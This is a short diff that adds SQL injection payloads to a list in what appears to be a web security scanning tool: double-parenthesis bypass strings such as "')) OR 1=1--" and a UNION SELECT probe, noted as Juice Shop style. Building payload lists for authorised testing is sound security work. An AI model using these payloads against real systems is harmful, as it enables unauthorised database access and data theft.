@@ -3168,6 +3168,8 @@ SQLI_PAYLOADS = [
     "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
     "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
     "') OR ('1'='1", "') OR ('1'='1'--",
+    "')) OR 1=1--", "'))--", "')) OR (('1'='1",  # Double-close parens (Juice Shop style)
+    "'))/*", "')) UNION SELECT NULL--",
     "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
     "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
     "1' UNION SELECT NULL,NULL,NULL--",
